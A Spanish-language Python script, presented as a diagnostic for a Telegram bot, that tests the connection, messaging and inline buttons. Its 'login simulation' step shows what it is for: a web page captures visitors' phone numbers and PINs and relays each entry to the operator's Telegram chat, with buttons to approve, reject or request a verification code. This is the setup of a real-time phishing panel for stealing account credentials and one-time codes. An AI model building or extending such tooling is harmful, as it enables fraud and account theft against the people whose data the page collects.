"""
Script de diagnóstico para probar el bot de Telegram
Ejecuta este archivo para verificar que todo funcione
"""

import asyncio
import sys
import os

print("="*60)
print("🔍 DIAGNÓSTICO DEL BOT DE TELEGRAM")
print("="*60)

# ========================================
# PASO 1: Verificar instalación de librerías
# ========================================
print("\n📦 Verificando librerías instaladas...")

try:
    import telegram
    print(f"✅ python-telegram-bot versión: {telegram.__version__}")
except ImportError:
    print("❌ python-telegram-bot NO está instalado")
    print("   Ejecuta: pip install python-telegram-bot")
    sys.exit(1)

try:
    from flask import Flask
    print("✅ Flask está instalado")
except ImportError:
    print("❌ Flask NO está instalado")
    print("   Ejecuta: pip install flask")
    sys.exit(1)

# ========================================
# PASO 2: Verificar configuración
# ========================================
print("\n⚙️ Verificando configuración...")

# Lee desde variables de entorno o pide al usuario
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')

if not BOT_TOKEN or BOT_TOKEN == "TU_TOKEN_AQUI":
    print("\n❓ Ingresa tu BOT_TOKEN (del @BotFather):")
    BOT_TOKEN = input("Token: ").strip()
    if not BOT_TOKEN:
        print("❌ Token vacío. Saliendo...")
        sys.exit(1)

if not ADMIN_CHAT_ID or ADMIN_CHAT_ID == "TU_CHAT_ID":
    print("\n❓ Ingresa tu ADMIN_CHAT_ID (de @userinfobot):")
    ADMIN_CHAT_ID = input("Chat ID: ").strip()
    if not ADMIN_CHAT_ID:
        print("❌ Chat ID vacío. Saliendo...")
        sys.exit(1)

print(f"✅ BOT_TOKEN configurado: {BOT_TOKEN[:10]}...")
print(f"✅ ADMIN_CHAT_ID configurado: {ADMIN_CHAT_ID}")

# ========================================
# PASO 3: Probar conexión con Telegram
# ========================================
print("\n🔌 Probando conexión con Telegram API...")

from telegram import Bot
from telegram.error import InvalidToken, TelegramError

async def test_bot_connection():
    try:
        bot = Bot(token=BOT_TOKEN)
        me = await bot.get_me()
        print(f"✅ Bot conectado exitosamente!")
        print(f"   Nombre: {me.first_name}")
        print(f"   Username: @{me.username}")
        print(f"   ID: {me.id}")
        return bot
    except InvalidToken:
        print("❌ TOKEN INVÁLIDO")
        print("   El token fue rechazado por Telegram")
        print("   Solución: Obtén un nuevo token de @BotFather")
        return None
    except TelegramError as e:
        print(f"❌ Error de Telegram: {e}")
        return None
    except Exception as e:
        print(f"❌ Error inesperado: {e}")
        return None

bot = asyncio.run(test_bot_connection())

if not bot:
    print("\n❌ No se pudo conectar al bot. Verifica el token.")
    sys.exit(1)

# ========================================
# PASO 4: Probar envío de mensaje
# ========================================
print("\n📤 Probando envío de mensaje...")

async def test_send_message():
    try:
        message = await bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text="🧪 <b>MENSAJE DE PRUEBA</b>\n\n"
                 "Si recibes este mensaje, tu bot está funcionando correctamente!\n\n"
                 "✅ Bot conectado\n"
                 "✅ Chat ID correcto\n"
                 "✅ Permisos OK",
            parse_mode='HTML'
        )
        print(f"✅ Mensaje enviado exitosamente!")
        print(f"   ID del mensaje: {message.message_id}")
        return True
    except TelegramError as e:
        print(f"❌ Error enviando mensaje: {e}")
        if "chat not found" in str(e).lower():
            print("   Solución: Verifica que el ADMIN_CHAT_ID sea correcto")
            print("   Asegúrate de haber iniciado conversación con el bot primero")
        return False
    except Exception as e:
        print(f"❌ Error inesperado: {e}")
        return False

mensaje_enviado = asyncio.run(test_send_message())

if not mensaje_enviado:
    print("\n❌ No se pudo enviar el mensaje.")
    print("\n💡 SOLUCIONES:")
    print("   1. Verifica que el ADMIN_CHAT_ID sea correcto")
    print("   2. Abre Telegram y busca tu bot")
    print("   3. Presiona 'Start' o envía /start")
    print("   4. Ejecuta este script de nuevo")
    sys.exit(1)

# ========================================
# PASO 5: Probar botones inline
# ========================================
print("\n🔘 Probando botones inline...")

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

async def test_inline_buttons():
    try:
        keyboard = [
            [
                InlineKeyboardButton("✅ Botón 1", callback_data="test_1"),
                InlineKeyboardButton("❌ Botón 2", callback_data="test_2")
            ],
            [
                InlineKeyboardButton("📋 Botón 3", callback_data="test_3")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = await bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text="🧪 <b>PRUEBA DE BOTONES</b>\n\n"
                 "Si ves botones debajo de este mensaje, ¡todo funciona!\n\n"
                 "Estos botones simularán:\n"
                 "✅ Aprobar sesión\n"
                 "❌ Rechazar sesión\n"
                 "📋 Ver lista",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        print(f"✅ Mensaje con botones enviado!")
        print(f"   Revisa tu Telegram, deberías ver botones")
        return True
    except Exception as e:
        print(f"❌ Error enviando botones: {e}")
        return False

botones_enviados = asyncio.run(test_inline_buttons())

# ========================================
# PASO 6: Probar simulación de login
# ========================================
print("\n🔐 Probando simulación de login...")

async def test_login_notification():
    try:
        session_id = "test_abc123"
        numero = "300 123 4567"
        clave = "1234"
        
        mensaje = (
            f"🚨 <b>PRUEBA DE NOTIFICACIÓN DE LOGIN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 Número: <code>{numero}</code>\n"
            f"🔑 Clave: <code>{clave}</code>\n"
            f"🆔 Sesión: <code>{session_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Así se vería cuando alguien ingrese a tu página"
        )
        
        keyboard = [
            [
                InlineKeyboardButton("✅ Aprobar", callback_data=f"aprobar_{session_id}"),
                InlineKeyboardButton("❌ Rechazar", callback_data=f"rechazar_{session_id}")
            ],
            [
                InlineKeyboardButton("🔄 Pedir Código", callback_data=f"pedir_{session_id}")
            ],
            [
                InlineKeyboardButton("📋 Ver Lista", callback_data="lista")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = await bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=mensaje,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        print(f"✅ Notificación de prueba enviada!")
        print(f"   Así se vería cuando alguien ingrese datos en tu web")
        return True
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

login_simulado = asyncio.run(test_login_notification())

# ========================================
# RESUMEN FINAL
# ========================================
print("\n" + "="*60)
print("📊 RESUMEN DEL DIAGNÓSTICO")
print("="*60)

tests = [
    ("Librerías instaladas", True),
    ("Configuración", True),
    ("Conexión con Telegram", bot is not None),
    ("Envío de mensajes", mensaje_enviado),
    ("Botones inline", botones_enviados),
    ("Simulación de login", login_simulado)
]

total = len(tests)
pasados = sum(1 for _, resultado in tests if resultado)

for nombre, resultado in tests:
    estado = "✅ PASS" if resultado else "❌ FAIL"
    print(f"{estado} - {nombre}")

print(f"\n📈 Resultado: {pasados}/{total} pruebas pasadas")

if pasados == total:
    print("\n🎉 ¡PERFECTO! Todo funciona correctamente")
    print("\n📝 CONFIGURACIÓN PARA TU PROYECTO:")
    print(f"   BOT_TOKEN = '{BOT_TOKEN}'")
    print(f"   ADMIN_CHAT_ID = '{ADMIN_CHAT_ID}'")
    print("\n✨ Usa estos valores en tu app.py o telegram_bot.py")
    print("\n🚀 SIGUIENTE PASO:")
    print("   1. Copia esos valores a tu proyecto")
    print("   2. Ejecuta: python app.py")
    print("   3. Abre tu página web e ingresa datos")
    print("   4. Deberías recibir notificación en Telegram")
else:
    print(f"\n⚠️ Hay {total - pasados} problema(s) que resolver")
    print("\n💡 REVISA LOS ERRORES ARRIBA Y:")
    if not bot:
        print("   - Verifica el BOT_TOKEN")
    if not mensaje_enviado:
        print("   - Verifica el ADMIN_CHAT_ID")
        print("   - Inicia conversación con el bot (/start)")

print("="*60)
